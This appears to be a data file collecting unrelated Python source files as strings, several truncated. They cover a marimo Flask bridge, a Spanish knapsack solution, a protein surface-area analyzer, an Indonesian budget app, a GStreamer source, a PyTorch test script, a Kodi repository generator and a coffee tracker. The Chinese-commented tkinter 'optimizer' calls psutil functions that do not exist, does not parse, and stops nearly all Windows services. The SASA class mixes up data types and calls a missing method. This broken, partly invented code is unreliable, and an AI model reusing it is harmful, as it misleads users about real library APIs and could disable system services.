    "#! /usr/bin/env nix-shell\n#! nix-shell -i python3 -p python3Packages.marimo python3Packages.flask python3Packages.matplotlib\n\nimport marimo\nfrom flask import Flask, request, jsonify\n\nimport re\nimport os\n\nfrom marimo._ast import codegen\nfrom marimo._ast.cell import CellConfig\nimport tempfile\n\nfrom marimo._output.formatters.formatters import (\n    register_formatters,\n)\nfrom marimo._output.formatting import try_format\nimport marimo as mo\n\n# Maybe do over sockets instead of web?\n# Feels very hacky\n\napp = Flask(__name__)\n\n# Just need globals\nsources = {}\nlookups = {}\n\n\n@app.route(\"/run\", methods=[\"POST\"])\ndef run():\n    data = request.get_json()\n    code = data.get(\"code\", None)\n    key = data.get(\"key\", None).strip()\n    print(\"run\", key, code)\n    if code is None or key is None:\n        return jsonify({\"error\": \"No code provided\"}), 400\n    sources[key] = code\n    return \"\"\n\n\n@app.route(\"/lookup\", methods=[\"POST\"])\ndef lookup():\n    data = request.get_json()\n    key = data.get(\"key\", None).strip()\n    if key is None or key not in lookups:\n        return jsonify({\"type\": \"html\", \"value\": \"error: No key provided\"}), 400\n    if lookups[key] is None:\n        return jsonify({\"type\": \"html\", \"value\": \"\"})\n\n    data = lookups[key]\n    output = try_format(data)\n    # Ideally handle this client side, but just a sanity check\n    if output.mimetype == \"image/png\":\n        return jsonify({\"type\": \"figure\", \"value\": f\"{output.data}\"})\n\n    # Default to whatever the output was, assuming html\n    return jsonify({\"type\": \"html\", \"value\": f\"{mo.as_html(data)}\"})\n\n\n@app.route(\"/execute\", methods=[\"GET\"])\ndef execute():\n\n    keys, code = list(zip(*sources.items()))\n    generated = codegen.generate_filecontents(\n        code,\n        keys,\n        [CellConfig() for _ in range(len(sources))],\n    )\n    with tempfile.NamedTemporaryFile(mode=\"w\", suffix=\".py\") as f:\n        f.write(generated)\n        f.seek(0)\n        app = codegen.get_app(f.name)\n\n    register_formatters()\n    for key, output in zip(keys, app.run()[0]):\n        lookups[key] = output\n    return \"\"\n\n\n@app.route(\"/flush\", methods=[\"GET\"])\ndef flush():\n    lookups.clear()\n    sources.clear()\n    return \"\"\n\n\n@app.route(\"/assets\", methods=[\"GET\"])\ndef assets():\n    # Read the HTML file\n    with open(f\"{marimo.__path__[0]}/_static/index.html\", \"r\") as file:\n        html_content = file.read()\n    (js,) = re.findall(r\"index-.*\\.js\", html_content)\n    (css,) = re.findall(r\"index-.*\\.css\", html_content)\n    base = f\"https://cdn.jsdelivr.net/npm/@marimo-team/frontend@{marimo.__version__}/dist/assets/\"\n    dev_server = os.environ.get(\"QUARTO_MARIMO_DEBUG_ENDPOINT\")\n    js = f\"{base}{js}\"\n    if dev_server:\n        js = f\"http://{dev_server}/src/main.tsx\"\n    return f\"\"\"\n      <div id=\"root\" style=\"display:none\"></div>\n      <marimo-mode data-mode=\"read\" hidden=\"\"></marimo-mode>\n      <marimo-filename hidden=\"\">quarto app</marimo-filename>\n      <marimo-version data-version=\"{marimo.__version__}\" hidden=\"\"></marimo-version>\n      <marimo-user-config data-config=\"{{}}\" hidden=\"\"> </marimo-user-config>\n      <marimo-app-config data-config=\"{{}}\"> </marimo-app-config>\n      <script data-marimo=\"true\">\n        window.__MARIMO_STATIC__ = {{}};\n        window.__MARIMO_STATIC__.version = \"{marimo.__version__}\";\n        window.__MARIMO_STATIC__.notebookState = {{}};\n        window.__MARIMO_STATIC__.assetUrl = \"{base}\";\n        window.__MARIMO_STATIC__.files = {{}};\n      </script>\n\n      <marimo-code hidden=\"\">\n      </marimo-code>\n\n      <link rel=\"stylesheet\" crossorigin=\"anonymous\" href=\"{base}{css}\">\n      <script type=\"module\" crossorigin=\"anonymous\" src=\"{js}\"></script>\n  \"\"\"\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True, port=6000)\n",
    "def max_earnings(n, m, c0, d0, chorizos):\n    # Inicializar dp con cero para todas las capacidades de masa desde 0 hasta n\n    dp = [0] * (n + 1)\n\n    # Iterar sobre cada tipo de chorizo\n    for ai, bi, ci, di in chorizos:\n        # Procesar de atr\u00e1s hacia adelante para evitar usar un bollo m\u00e1s de una vez\n        for j in range(n, ci - 1, -1):\n            # Calcular cu\u00e1ntos bollos con este chorizo podemos hacer con masa j\n            max_bollos = min(ai // bi, j // ci)\n            # Actualizar dp para cada cantidad de masa posible\n            for k in range(1, max_bollos + 1):\n                dp[j] = max(dp[j], dp[j - k * ci] + k * di)\n\n    # Procesar los bollos sin relleno\n    for j in range(c0, n + 1):\n        dp[j] = max(dp[j], dp[j - c0] + d0)\n\n    # La respuesta es el m\u00e1ximo valor en dp\n    return max(dp)\n\n# Lectura de entrada\nimport sys\ninput = sys.stdin.read\ndata = input().split()\n\nn = int(data[0])\nm = int(data[1])\nc0 = int(data[2])\nd0 = int(data[3])\n\nchorizos = []\nindex = 4\nfor _ in range(m):\n    ai = int(data[index])\n    bi = int(data[index + 1])\n    ci = int(data[index + 2])\n    di = int(data[index + 3])\n    chorizos.append((ai, bi, ci, di))\n    index += 4\n\n# Llamar a la funci\u00f3n para obtener la m\u00e1xima ganancia posible\nresult = max_earnings(n, m, c0, d0, chorizos)\nprint(result)\n",
    "import tkinter as tk\nimport psutil\n\ndef optimize_memory():\n    # \u7ec8\u6b62\u4e0d\u5fc5\u8981\u7684\u670d\u52a1\n    for service in psutil.win_service_iter():\n        if service.name() not in ['wuauserv', 'SysMain', 'BITS']:\n            try:\n                service.stop()\n            except psutil.NoSuchProcess:\n                pass\n\n    # \u6e05\u9664\u7f13\u5b58\n    psutil.swap().cached = 0\n\n    # \u538b\u7f29\u5185\u5b58\n    psutil.virtual_memory().compress()\n\n    # \u8c03\u6574\u865a\u62df\u5185\u5b58\u8bbe\u7f6e\n    psutil.virtual_memory().set_pagefile(0)\n\n    # \u7b49\u5f85\u7cfb\u7edf\u7a33\u5b9a\n    time.sleep(60)\n\n    # \u518d\u6b21\u538b\u7f29\u5185\u5b58\n    psutil.virtual_memory().compress()\n\ndef optimize_cpu():\n    # \u8bbe\u7f6e CPU \u4f18\u5148\u7ea7\n    for proc in psutil.process_iter():\n        if proc.info['name'] not in ['System', 'Idle']:\n            try:\n                proc.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)\n            except psutil.NoSuchProcess:\n                pass\n\ndef optimize_gpu():\n    # \u8c03\u6574 GPU \u8bbe\u7f6e\uff08\u5982\u679c\u9002\u7528\uff09\n\ndef main():\n    # \u521b\u5efa\u56fe\u5f62\u5316\u754c\u9762\n    window = tk.Tk()\n    window.title(\"\u5185\u5b58\u3001CPU \u548c GPU \u4f18\u5316\u5668\")\n\n    # \u521b\u5efa\u6309\u94ae\n    memory_optimize_button = tk.Button(window, text=\"\u4f18\u5316\u5185\u5b58\", command=optimize_memory)\n    cpu_optimize_button = tk.Button(window, text=\"\u4f18\u5316 CPU\", command=optimize_cpu)\n    gpu_optimize_button = tk.Button(window, text=\"\u4f18\u5316 GPU\", command=optimize_gpu)\n\n    # \u5e03\u5c40\u6309\u94ae\n    memory_optimize_button.pack()\n    cpu_optimize_button.pack()\n    gpu_optimize_button.pack()\n\n    # \u8fd0\u884c\u4e3b\u5faa\u73af\n    window.mainloop()\n\nif __name__ == \"__main__\":\n    main()\n",
    "from Bio.PDB import PDBParser, PDBIO\nfrom Bio.PDB.SASA import ShrakeRupley\nimport matplotlib.pyplot as plt\nimport os\n\n\nclass ProteinSASA:\n  \"\"\"\n  Class to calculate and analyze Solvent Accessible Surface Area (SASA) of a protein at different levels.\n  \"\"\"\n\n  def __init__(self, pdb_file, probe_radius=1.4):\n    \"\"\"\n    Initializes the ProteinSASA object with PDB file path and probe radius.\n\n    Args:\n        pdb_file (str): Path to the PDB file containing the protein structure.\n        probe_radius (float, optional): Radius of the probe sphere (in Angstrom). Defaults to 1.4.\n    \"\"\"\n\n    self.pdb_file = pdb_file\n    self.probe_radius = probe_radius\n    self.sasa_dict = {}\n\n  def calculate_sasa(self):\n    \"\"\"\n    Calculates the SASA for the protein at all levels (atoms, residues, chains, total).\n    \"\"\"\n\n    filename = os.path.splitext(os.path.basename(self.pdb_file))[0]\n    p = PDBParser(QUIET=1)\n    struct = p.get_structure(filename, self.pdb_file)\n    sr = ShrakeRupley()\n    for level in (\"A\", \"R\", \"C\", \"M\", \"S\"):\n      sr.compute(struct, level)\n      self.sasa_dict[level] = round(struct.sasa, 2)\n\n  def get_total_sasa(self, level):\n    \"\"\"\n    Returns the total SASA for the protein at a specified level.\n\n    Args:\n        level (str): Level for which total SASA is requested (e.g., \"A\" for atoms, \"R\" for residues, \"C\" for chains, \"total\").\n\n    Returns:\n        float: Total SASA for the protein at the specified level.\n    \"\"\"\n\n    if not self.sasa_dict:\n      self.calculate_sasa()\n\n    if level not in self.sasa_dict:\n      raise ValueError(f\"Invalid level '{level}'. Supported levels: A, R, C, M, S\")\n\n    return self.sasa_dict[level]\n\n  def plot_sasa(self, level, save_plot=True):\n    \"\"\"\n    Plots the SASA for the protein at a specified level.\n\n    Args:\n        level (str): Level for which SASA is plotted (e.g., \"A\" for atoms, \"R\" for residues, \"C\" for chains).\n    \"\"\"\n\n    if not self.sasa_dict:\n      self.calculate_sasa()\n\n    if level not in self.sasa_dict:\n      raise ValueError(f\"Invalid level '{level}'. Supported levels: A, R, C\")\n\n    if level == \"A\":\n      data_x, data_y = zip(*self.sasa_dict[level].items())\n      plt.bar(data_x, data_y)\n      plt.xlabel(\"Atom ID\")\n    elif level == \"R\":\n      data_x, data_y = zip(*self.sasa_dict[level].items())\n      plt.bar(data_x, data_y)\n      plt.xlabel(\"Residue ID\")\n    elif level == \"C\":\n      data_x, data_y = zip(*self.sasa_dict[level].items())\n      plt.bar(data_x, data_y)\n      plt.xlabel(\"Chain ID\")\n    plt.ylabel(\"SASA (Angstrom^2)\")\n    plt.title(f\"{level} Level SASA\")\n    if save_plot:\n      # Create Results folder if it doesn't exist\n      results_folder = \"Results\"\n      os.makedirs(results_folder, exist_ok=True)  # Create folder if it doesn't exist\n\n      # Extract filename from PDB file path\n      filename = os.path.splitext(os.path.basename(self.pdb_file))[0]\n      plot_filepath = os.path.join(results_folder, f\"{filename}_{level}_sasa.png\")\n\n      plt.savefig(plot_filepath)  # Save plot with filename based on level\n      print(f\"Plot saved to: {plot_filepath}\")\n    else:\n      plt.show()\n      plt.close()  # Close the plot window\n\n  def print_results(self):\n    \"\"\"\n    Prints the total SASA for the protein at all levels (atoms, residues, chains, total).\n    \"\"\"\n\n    if not self.sasa_dict:\n      self.calculate_sasa()\n\n    for level in (\"A\", \"R\", \"C\", \"M\", \"S\"):\n      total_sasa = self.get_total_sasa(level)\n      level_name = {\n        \"A\": \"Atoms\",\n        \"R\": \"Residues\",\n        \"C\": \"Chains\",\n        \"M\": \"Model\",\n        \"S\": \"Structure\"\n      }[level]\n      print(f\"{level_name} SASA: {total_sasa:.2f} \u00c5\u00b2\")\n    print(\"-\"*20)\n\n\ndef main(pdb_folder):\n  \"\"\"\n  Analyzes SASA for all PDB files in a specified folder.\n\n  Args:\n      pdb_folder (str): Path to the folder containing PDB files.\n  \"\"\"\n\n  for filename in os.listdir(pdb_folder):\n    if filename.endswith(\".pdb\"):\n      pdb_filepath = os.path.join(pdb_folder, filename)\n      protein = ProteinSASA(pdb_filepath)\n      protein.calculate_sasa()\n      print(f\"Protein: {filename}\")\n      protein.print_results()\n      for level in (\"A\", \"R\", \"C\", \"M\", \"S\"):\n        protein.plot_residue_sasa(level)\n      print(\"-\"*20)\n\nif __name__ == \"__main__\":\n  pdb_folder = \"PDB\"\n  main(pdb_folder=pdb_folder)\n",
    "\"\"\"\r\nTugas Besar - 1 Matakuliah KU1102 Pengenalan Komputasi\r\nSemester 2 2023/2024\r\n\r\n\"Budgetin\"\r\nSistem pencatatan pemasukan dan pengeluaran sebagai solusi \r\npenganggaran dana harian Mahasiswa\r\n\r\nOleh :\r\nNansha Hernanda                 [16723425]: Software Engineer and Gui Designer\r\nMuhammad Iqra Al Farel          [16723383]: xxx\r\nDzakwan Rashif Putera Insani    [16723401]: xxx\r\nHauna Azzahra Afifa Nur         [16723365]: xxx\r\nNirmala Avie Cena               [16723353]: xxx\r\nKarissa Maheswari               [16723397]: xxx nanti diisi\r\n\"\"\"\r\n# KAMUS\r\n## Daftar variabel \r\n# master                   : Tk            : Tkinter window utama\r\n# transactions             : list          : Daftar transaksi yang disubmit\r\n# balance                  : int           : Saldo saat ini\r\n# total_income             : int           : Total pemasukan\r\n# total_expense            : int           : Total pengeluaran\r\n# label_name               : Label         : Label untuk nama transaksi\r\n# entry_name               : Entry         : Entry untuk memasukkan nama transaksi\r\n# label_amount             : Label         : Label untuk jumlah transaksi\r\n# entry_amount             : Entry         : Entry untuk memasukkan jumlah transaksi\r\n# label_type               : Label         : Label untuk jenis transaksi\r\n# transaction_type         : StringVar     : StringVar untuk jenis transaksi\r\n# option_type              : OptionMenu    : OptionMenu untuk memilih jenis transaksi\r\n# label_date               : Label         : Label untuk tanggal transaksi\r\n# entry_date               : Entry         : Entry untuk memasukkan tanggal transaksi\r\n# submit_button            : Button        : Button untuk men-submit transaksi\r\n# label_balance            : Label         : Label untuk menampilkan saldo saat ini\r\n# label_income             : Label         : Label untuk menampilkan total pemasukan\r\n# label_expense            : Label         : Label untuk menampilkan total pengeluaran\r\n# plot_button              : Button        : Button untuk menampilkan grafik\r\n# transaction_history_tree : Treeview      : Treeview untuk menampilkan riwayat transaksi\r\n\r\n## fungsi/prosedur\r\n# __init__(self, master)            : Inisialisasi objek Budgetin.\r\n#   - master                        : Tkinter GUI window utama.\r\n# submit_transaction(self)          : Menambahkan transaksi baru.\r\n#   - name                          : Nama transaksi.\r\n#   - amount                        : Jumlah transaksi.\r\n#   - transaction_type              : Jenis transaksi (\"Pemasukan\" atau \"Pengeluaran\").\r\n#   - date                          : Tanggal transaksi (dalam format \"DD-MM-YYYY\").\r\n# update_labels(self)               : Memperbarui label saldo, total pemasukan, dan total pengeluaran.\r\n# update_transaction_history(self)  : Memperbarui riwayat transaksi pada Treeview.\r\n# plot_graph(self)                  : Menampilkan grafik pie dari total pemasukan dan pengeluaran(dengan module matplotlib).\r\n# main()                            : Fungsi utama untuk menjalankan program.\r\n\r\n# ALGORITMA\r\n\r\n# import module\r\nimport sys\r\nsys.path.append(r'C:\\Users\\User\\AppData\\Local\\Programs\\Python\\Python311\\Lib\\site-packages')\r\n# Mengimpor modul tkinter dan memberikannya alias \"tk\" sebagai Graphical User Interface program ini.\r\nimport tkinter as tk\r\n# Mengimpor fungsi \"messagebox\" dan modul \"ttk\" dari modul tkinter.\r\nfrom tkinter import messagebox, ttk\r\n# Mengimpor fungsi \"datetime\" dari modul datetime yang akan digunakan untuk tanggal dan waktu pada program.\r\nfrom datetime import datetime\r\n# Mengimpor modul \"pyplot\" dari library matplotlib dan memberikannya alias \"plt\" yang akan digunakan pada pembuatan grafik\r\nimport matplotlib.pyplot as plt\r\n\r\n# mendefinisikan class utama berisi gui dan program yang akan digunakan pada aplikasi Budgetin\r\nclass Budgetin:\r\n# def __init__()= fungsi inisialisasi atribut dan widget GUI yang diperlukan Budgetin\r\n# (self)        = mengikat/mengaitkan atribut dan metode dalam kode dibawah kepada class Budgetin, agar saat\r\n#                 mengakses suatu atribut seperi self.balance, kita mengakses atribut balance dari Budgetin, begitu pula pada atribut lain\r\n# (master)      = tkinter window utama GUI Budgetin nantinya akan ditampilkan\r\n    def __init__(self, master):\r\n        self.master = master\r\n        self.master.title(\"Budgetin!\") # membuat judul window utama apllikasi ini benjadi \"Budgetn\"\r\n\r\n        self.transactions = []  # deklarasi array/list kosong untuk menyimpan transaksi yang ada\r\n        self.balance = 0        # deklarasi dan inisialisasi saldo(balance) awal, yaitu 0\r\n        self.total_income = 0   # deklarasi dan inisialisasi total pemasukan(income) awal, yaitu 0\r\n        self.total_expense = 0  # deklarasi dan inisialisasi total pengeluaran(expense) awal, yaitu 0\r\n\r\n        self.label_name = tk.Label(master, text=\"Nama Transaksi:\") # membuat label \"nama transaksi\"\r\n        self.label_name.grid(row=0, column=0) # posisi label nama transaksi ada di baris 0 dan kolom 0 pa",
    "import asyncio\nimport logging\n\nfrom dailyai.pipeline.frames import (Frame, AudioFrame, ImageFrame)\nfrom dailyai.pipeline.frame_processor import FrameProcessor\n\nfrom typing import AsyncGenerator\n\ntry:\n    import gi\n    gi.require_version('Gst', '1.0')\n    gi.require_version('GstApp', '1.0')\n    from gi.repository import Gst, GstApp, GLib\nexcept ModuleNotFoundError as e:\n    print(f\"Exception: {e}\")\n    print(\n        \"In order to use the GStreamer Daily transport, you need to install GStreamer`.\")\n    raise Exception(f\"Missing module: {e}\")\n\nVIDEO_WIDTH = 1024\nVIDEO_HEIGHT = 576\nAUDIO_SAMPLE_RATE = 16000\nAUDIO_CHANNELS = 1\n\n\nclass GStreamerFileSource(FrameProcessor):\n    def __init__(self, filename: str, sink_queue, loop, **kwargs):\n        super().__init__(**kwargs)\n\n        Gst.init()\n\n        self._loop = loop\n        self._sink_queue = sink_queue\n        self._logger: logging.Logger = logging.getLogger(\"dailyai\")\n\n        self._player = Gst.Pipeline.new(\"player\")\n\n        source = Gst.ElementFactory.make(\"filesrc\", None)\n        source.set_property(\"location\", filename)\n\n        decodebin = Gst.ElementFactory.make(\"decodebin\", None)\n        decodebin.connect(\"pad-added\", self._decodebin_callback)\n\n        self._player.add(source)\n        self._player.add(decodebin)\n        source.link(decodebin)\n\n        bus = self._player.get_bus()\n        bus.add_signal_watch()\n        bus.connect(\"message\", self._on_gstreamer_message)\n\n    async def process_frame(self, frame: Frame) -> AsyncGenerator[Frame, None]:\n        yield frame\n\n    def start(self):\n        self._player.set_state(Gst.State.PLAYING)\n\n    def _on_gstreamer_message(self, bus, message):\n        t = message.type\n        if t == Gst.MessageType.ERROR:\n            err, debug = message.parse_error()\n            self._logger.error(f\"Error: {err} : {debug}\")\n        return True\n\n    def _decodebin_callback(self, decodebin, pad):\n        caps_string = pad.get_current_caps().to_string()\n        if caps_string.startswith(\"audio\"):\n            self._decodebin_audio(pad)\n        elif caps_string.startswith(\"video\"):\n            self._decodebin_video(pad)\n\n    def _decodebin_audio(self, pad):\n        queue_audio = Gst.ElementFactory.make(\"queue\", None)\n        audioconvert = Gst.ElementFactory.make(\"audioconvert\", None)\n        audioresample = Gst.ElementFactory.make(\"audioresample\", None)\n        audiocapsfilter = Gst.ElementFactory.make(\"capsfilter\", None)\n        audiocaps = Gst.Caps.from_string(\n            f\"audio/x-raw,format=S16LE,rate={AUDIO_SAMPLE_RATE},channels={AUDIO_CHANNELS},layout=interleaved\")\n        audiocapsfilter.set_property(\"caps\", audiocaps)\n        appsink_audio = Gst.ElementFactory.make(\"appsink\", None)\n        appsink_audio.set_property(\"emit-signals\", True)\n        appsink_audio.connect(\"new-sample\", self._appsink_audio_new_sample)\n\n        self._player.add(queue_audio)\n        self._player.add(audioconvert)\n        self._player.add(audioresample)\n        self._player.add(audiocapsfilter)\n        self._player.add(appsink_audio)\n        queue_audio.sync_state_with_parent()\n        audioconvert.sync_state_with_parent()\n        audioresample.sync_state_with_parent()\n        audiocapsfilter.sync_state_with_parent()\n        appsink_audio.sync_state_with_parent()\n\n        queue_audio.link(audioconvert)\n        audioconvert.link(audioresample)\n        audioresample.link(audiocapsfilter)\n        audiocapsfilter.link(appsink_audio)\n\n        queue_pad = queue_audio.get_static_pad(\"sink\")\n        pad.link(queue_pad)\n\n    def _decodebin_video(self, pad):\n        queue_video = Gst.ElementFactory.make(\"queue\", None)\n        videoconvert = Gst.ElementFactory.make(\"videoconvert\", None)\n        videoscale = Gst.ElementFactory.make(\"videoscale\", None)\n        videocapsfilter = Gst.ElementFactory.make(\"capsfilter\", None)\n        videocaps = Gst.Caps.from_string(\n            f\"video/x-raw,format=RGB,width={VIDEO_WIDTH},height={VIDEO_HEIGHT}\")\n        videocapsfilter.set_property(\"caps\", videocaps)\n\n        appsink_video = Gst.ElementFactory.make(\"appsink\", None)\n        appsink_video.set_property(\"emit-signals\", True)\n        appsink_video.connect(\"new-sample\", self._appsink_video_new_sample)\n\n        self._player.add(queue_video)\n        self._player.add(videoconvert)\n        self._player.add(videoscale)\n        self._player.add(videocapsfilter)\n        self._player.add(appsink_video)\n        queue_video.sync_state_with_parent()\n        videoconvert.sync_state_with_parent()\n        videoscale.sync_state_with_parent()\n        videocapsfilter.sync_state_with_parent()\n        appsink_video.sync_state_with_parent()\n\n        queue_video.link(videoconvert)\n        videoconvert.link(videoscale)\n        videoscale.link(videocapsfilter)\n        videocapsfilter.link(appsink_video)\n\n        queue_pad = queue_video.get_static_pad(\"sink\")\n        pad.link(queue_pad)\n\n    def _appsink_audio_new_sample(self, appsink):\n        buffer = appsink.pull_sample().get_buffer()",
    "import numpy as np\r\nimport torch\r\nfrom tqdm import tqdm\r\nfrom modules import data_loader\r\nfrom modules.data_loader import TestLoader, BCDDataset, transformation\r\nfrom modules.model import BCDNet\r\n\r\n# Fix random seeds for reproducibility\r\nSEED = 42\r\ntorch.manual_seed(SEED)\r\ntorch.backends.cudnn.deterministic = True\r\ntorch.backends.cudnn.benchmark = False\r\nnp.random.seed(SEED)\r\n\r\n# Prepare the device\r\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\r\n\r\n# Create the model\r\nnet = BCDNet().to(device)\r\n\r\n# Load the model from the checkpoint\r\nnet.load_state_dict(torch.load('checkpoints/best_model.pth'))\r\n\r\n# Create the loss function\r\nloss = torch.nn.CrossEntropyLoss()\r\n\r\n# Create the test_set\r\ndataset = BCDDataset('./data', transformation)\r\ntrain_set, val_set, test_set = data_loader.split(dataset)\r\n\r\n# Create the TestLoader\r\ntest_loader = TestLoader(test_set, batch_size=64, shuffle=True)\r\n\r\n# Test the model\r\nnet.eval()\r\ncorrect = 0\r\ntotal = 0\r\nwith torch.no_grad():\r\n    loop = tqdm(test_loader, total=len(test_loader))\r\n    for images, labels in loop:\r\n        images = images.to(device)\r\n        labels = labels.to(device)\r\n        outputs = net(images)\r\n        _, predicted = torch.max(outputs.data, 1)\r\n        total += labels.size(0)\r\n        correct += (predicted == labels).sum().item()\r\n        accuracy = 100 * correct / total\r\n        loop.set_description(f'Accuracy: {accuracy:.2f}%')\r\n",
    "'''Lucas, a university student, is working on a project where he needs to process a set of student records. He is given a list of students where each record contains the student's name and marks in three subjects: Math, Physics, Biology. Each subject's mark is within the range 0-100. He needs to return the name of the student with the highest average score.\n\nIf there is more than one student who has the highest average score, Lucas needs to return the first student in the list.\n\nInput:\n\nThe first line contains an integer 'n' (1 <= n <= 1000) - representing the number of students.\nThe 'n' following lines each contain a string and three space-separated integers.\nOutput:\n\nPrint the name of the student who has the highest average score.\nSample Input:\n\n5\nJohn 85 90 82\nAlice 90 91 92\nBob 80 79 81\nLucas 88 90 92\nMaria 90 91 90\nSample Output:\n\nAlice\nNote: The five students' average scores are as follows:\n\nJohn's average is 85.67\nAlice's average is 91\nBob's average is 80\nLucas's average is 90\nMaria's average is 90.33\nAlice has the highest average score and showcases the best performance among all students.\n\n'''\nclass Student:\n    def __init__(self, name, scores):\n        self._name = name  # protected attribute\n        self.__scores = scores  # private attribute\n\n    def calculate_average(self):\n        return sum(self.__scores) / len(self.__scores)\n\n    def get_name(self):  # public method to access protected attribute\n        return self._name\n\n\nclass TopStudentFinder:\n    def __init__(self):\n        self.max_avg = -1.0\n        self.top_student = \"\"\n\n    def find_top_student(self, students):\n       \n\n        for student in  students:\n            avg_score=student.calculate_average()\n            if avg_score>self.max_avg:\n                self.max_avg=avg_score\n                self.top_student=student.get_name()\n                \n            \n\n\n        \n    def get_top_student(self):\n        return self.top_student\n\n\nif __name__ == \"__main__\":\n    n = int(input())\n    students_data = []\n\n    for _ in range(n):\n        student_info = input().split()\n        name = student_info[0]\n        scores = list(map(int, student_info[1:]))\n        students_data.append(Student(name, scores))\n\n    \n\n    top_student_finder=TopStudentFinder()\n    top_student_finder.find_top_student(students_data)\n    top_student=top_student_finder.get_top_student()\n    print(top_student)\n   \n",
    "\"\"\" \n    Put this script in the root folder of your repo and it will\n    zip up all addon folders, create a new zip in your zips folder\n    and then update the md5 and addons.xml file\n\"\"\"\n\nimport hashlib\nimport os\nimport shutil\nimport sys\nimport zipfile\n\nfrom xml.etree import ElementTree\n\nSCRIPT_VERSION = 5\nKODI_VERSIONS = [\"krypton\", \"leia\", \"matrix\", \"nexus\", \"omega\", \"repo\"]\nIGNORE = [\n    \".git\",\n    \".github\",\n    \".gitignore\",\n    \".DS_Store\",\n    \"thumbs.db\",\n    \".idea\",\n    \"venv\",\n]\n_COLOR_ESCAPE = \"\\x1b[{}m\"\n_COLORS = {\n    \"black\": \"30\",\n    \"red\": \"31\",\n    \"green\": \"4;32\",\n    \"yellow\": \"3;33\",\n    \"blue\": \"34\",\n    \"magenta\": \"35\",\n    \"cyan\": \"1;36\",\n    \"grey\": \"37\",\n    \"endc\": \"0\",\n}\n\n\ndef _setup_colors():\n    \"\"\"\n    Return True if the running system's terminal supports color,\n    and False otherwise.\n    \"\"\"\n\n    def vt_codes_enabled_in_windows_registry():\n        \"\"\"\n        Check the Windows registry to see if VT code handling has been enabled by default.\n        \"\"\"\n        try:\n            import winreg\n        except:\n            return False\n        else:\n            reg_key = winreg.OpenKey(\n                winreg.HKEY_CURRENT_USER, \"Console\", access=winreg.KEY_ALL_ACCESS\n            )\n            try:\n                reg_key_value, _ = winreg.QueryValueEx(reg_key, \"VirtualTerminalLevel\")\n            except FileNotFoundError:\n                try:\n                    winreg.SetValueEx(\n                        reg_key, \"VirtualTerminalLevel\", 0, winreg.KEY_DWORD, 1\n                    )\n                except:\n                    return False\n                else:\n                    reg_key_value, _ = winreg.QueryValueEx(\n                        reg_key, \"VirtualTerminalLevel\"\n                    )\n            else:\n                return reg_key_value == 1\n\n    def is_a_tty():\n        return hasattr(sys.stdout, \"isatty\") and sys.stdout.isatty()\n\n    def legacy_support():\n        console = 0\n        color = 0\n        if sys.platform in [\"linux\", \"linux2\", \"darwin\"]:\n            pass\n        elif sys.platform == \"win32\":\n            color = os.system(\"color\")\n\n            from ctypes import windll\n\n            k = windll.kernel32\n            console = k.SetConsoleMode(k.GetStdHandle(-11), 7)\n\n        return any([color == 1, console == 1])\n\n    return any(\n        [\n            is_a_tty(),\n            sys.platform != \"win32\",\n            \"ANSICON\" in os.environ,\n            \"WT_SESSION\" in os.environ,\n            os.environ.get(\"TERM_PROGRAM\") == \"vscode\",\n            vt_codes_enabled_in_windows_registry(),\n            legacy_support(),\n        ]\n    )\n\n\n_SUPPORTS_COLOR = _setup_colors()\n\n\ndef color_text(text, color):\n    \"\"\"\n    Return an ANSI-colored string, if supported.\n    \"\"\"\n\n    return (\n        '{}{}{}'.format(\n            _COLOR_ESCAPE.format(_COLORS[color]),\n            text,\n            _COLOR_ESCAPE.format(_COLORS[\"endc\"]),\n        )\n        if _SUPPORTS_COLOR\n        else text\n    )\n\n\ndef convert_bytes(num):\n    \"\"\"\n    this function will convert bytes to MB.... GB... etc\n    \"\"\"\n    for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:\n        if num < 1024.0:\n            return \"%3.1f %s\" % (num, x)\n        num /= 1024.0\n\n\nclass Generator:\n    \"\"\"\n    Generates a new addons.xml file from each addons addon.xml file\n    and a new addons.xml.md5 hash file. Must be run from the root of\n    the checked-out repo.\n    \"\"\"\n\n    def __init__(self, release):\n        self.release_path = release\n        self.zips_path = os.path.join(self.release_path, \"zips\")\n        addons_xml_path = os.path.join(self.zips_path, \"addons.xml\")\n        md5_path = os.path.join(self.zips_path, \"addons.xml.md5\")\n\n        if not os.path.exists(self.zips_path):\n            os.makedirs(self.zips_path)\n\n        self._remove_binaries()\n\n        if self._generate_addons_file(addons_xml_path):\n            print(\n                \"Successfully updated {}\".format(color_text(addons_xml_path, 'yellow'))\n            )\n\n            if self._generate_md5_file(addons_xml_path, md5_path):\n                print(\"Successfully updated {}\".format(color_text(md5_path, 'yellow')))\n\n    def _remove_binaries(self):\n        \"\"\"\n        Removes any and all compiled Python files before operations.\n        \"\"\"\n\n        for parent, dirnames, filenames in os.walk(self.release_path):\n            for fn in filenames:\n                if fn.lower().endswith(\"pyo\") or fn.lower().endswith(\"pyc\"):\n                    compiled = os.path.join(parent, fn)\n                    try:\n                        os.remove(compiled)\n                        print(\n                            \"Removed compiled python file: {}\".format(\n                                color_text(compiled, 'green')\n                            )\n                        )\n                    except:\n                        print(\n                            \"Failed to remove compiled python file: {}\".format(\n                                color_text(compiled, 'red')\n               ",
    "#Here I combined every good suggestion\r\n# Chat GPT made\r\n\r\n\"\"\"Cafeteria orders\"\"\"\r\nRECIPE = {\r\n        \"espresso\": {'espresso': 30},\r\n        \"latte\": {'espresso': 60, 'steamed_milk': 120, 'foamed_milk': 15},\r\n        \"macchiato\": {'espresso': 60, 'foamed_milk': 15},\r\n        \"flat white\": {'espresso': 60, 'steamed_milk': 120},\r\n        \"dopio\": {'espresso': 60},\r\n        \"cappuccino\": {'espresso': 60, 'steamed_milk': 60, 'foamed_milk': 60},\r\n        \"lungo\": {'espresso': 90},\r\n        \"cortado\": {'espresso': 60, 'steamed_milk': 60}\r\n        }\r\n\r\nclass Track:\r\n    '''Class to track orders'''\r\n\r\n    __beans = 5000\r\n    __milk = 20000\r\n    safety = True\r\n\r\n    ###\r\n    t_beans = 0\r\n    t_milk = 0\r\n    t_revenue = 0\r\n    ###\r\n\r\n    MENU = {\r\n        \"espresso\":  40,\r\n        \"latte\": 70,\r\n        \"flat white\": 70,\r\n        \"dopio\":  50,\r\n        \"cappuccino\":  60,\r\n        \"lungo\": 50,\r\n        \"cortado\": 55,\r\n        \"mocca\": 60}\r\n    orders = []\r\n\r\n    def __init__(self, date) -> None:\r\n        self.date = date\r\n\r\n    